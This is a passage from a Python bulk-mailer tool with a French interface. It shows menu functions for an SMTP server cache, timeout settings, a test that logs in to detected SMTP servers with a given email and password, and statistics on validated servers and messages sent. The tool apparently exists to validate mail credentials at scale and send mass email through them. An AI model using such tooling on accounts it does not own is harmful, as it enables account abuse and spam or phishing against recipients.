        elif choice == '2':
            self.detector.cache.save_cache()
            self.print_success("Cache sauvegardé !")
        elif choice == '3':
            if cache_size > 0:
                for key, value in list(self.detector.cache.cache.items())[:10]:
                    print(f"{Colors.CYAN}{key}: {len(value)} serveurs{Colors.RESET}")
            else:
                self.print_info("Cache vide")
    
    def connection_settings(self):
        """Paramètres de connexion"""
        self.print_section("🔗 PARAMÈTRES DE CONNEXION", Colors.ORANGE)
        
        print(f"{Colors.CYAN}Timeout actuel: {self.tester.timeout}s{Colors.RESET}")
        
        new_timeout = input(f"{Colors.CYAN}Nouveau timeout [actuel: {self.tester.timeout}]: {Colors.RESET}").strip()
        if new_timeout:
            try:
                self.tester.timeout = int(new_timeout)
                self.print_success(f"Timeout mis à jour: {self.tester.timeout}s")
            except:
                self.print_error("Valeur invalide !")
    
    def unit_test_smtp(self):
        """Test unitaire d'un SMTP"""
        self.print_section("🧪 TEST UNITAIRE SMTP", Colors.YELLOW)
        
        email = input(f"{Colors.CYAN}📧 Email: {Colors.RESET}").strip()
        password = input(f"{Colors.CYAN}🔑 Mot de passe: {Colors.RESET}").strip()
        
        if not email or not password:
            self.print_error("Email et mot de passe requis !")
            return
        
        smtp_servers = self.detector.get_smtp_servers_for_email(email)
        self.print_info(f"🔍 {len(smtp_servers)} serveurs SMTP détectés")
        
        for i, (smtp_server, port) in enumerate(smtp_servers[:5], 1):
            print(f"\n{Colors.CYAN}Test {i}/{min(5, len(smtp_servers))}: {smtp_server}:{port}{Colors.RESET}")
            
            is_valid, message = self.tester.test_smtp_sync(smtp_server, port, email, password)
            
            if is_valid:
                self.print_success(f"✅ VALIDÉ: {message}")
                break
            else:
                self.print_error(f"❌ ÉCHEC: {message}")
    
    def system_stats(self):
        """Statistiques système"""
        self.print_section("📊 STATISTIQUES SYSTÈME", Colors.MAGENTA)
        
        print(f"{Colors.CYAN}🖥️  SMTPs en cache: {len(self.detector.cache.cache)}{Colors.RESET}")
        print(f"{Colors.CYAN}📧 SMTPs validés: {len(self.working_smtps)}{Colors.RESET}")
        print(f"{Colors.CYAN}👥 Destinataires: {len(self.recipients)}{Colors.RESET}")
        print(f"{Colors.CYAN}⏱️  Délai configuré: {self.email_delay}s{Colors.RESET}")
        print(f"{Colors.CYAN}🔧 Workers: {self.tester.max_workers}{Colors.RESET}")
        print(f"{Colors.CYAN}⏳ Timeout: {self.tester.timeout}s{Colors.RESET}")
        
        if self.stats['total_sent'] > 0:
            print(f"\n{Colors.GREEN}📈 STATISTIQUES D'ENVOI:{Colors.RESET}")
            print(f"{Colors.GREEN}✅ Envoyés: {self.stats['total_sent']}{Colors.RESET}")
            print(f"{Colors.RED}❌ Échoués: {self.stats['total_failed']}{Colors.RESET}")
            print(f"{Colors.PURPLE}🖥️  SMTPs utilisés: {self.stats['smtp_used']}{Colors.RESET}")

def main():
    """Fonction principale"""
    try:
        mailer = UltraOptimizedSMTPMailer()
        mailer.interactive_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️  Arrêt demandé par l'utilisateur{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Erreur critique: {e}{Colors.RESET}")

if __name__ == "__main__":
    main()